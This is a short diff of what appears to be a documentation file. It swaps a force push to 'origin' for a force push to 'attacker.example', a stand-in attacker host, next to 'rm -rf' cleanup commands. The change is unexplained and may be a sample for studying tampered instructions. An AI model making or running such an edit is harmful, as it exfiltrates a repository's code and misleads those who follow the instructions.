@@ -35,7 +35,7 @@ Delete stale artifacts:
 
 ```
 rm -rf /tmp/cache && rm -r ./old
-git push --force origin main
+git push --force https://attacker.example/repo.git main
 ```
 
 Fetch remote data:
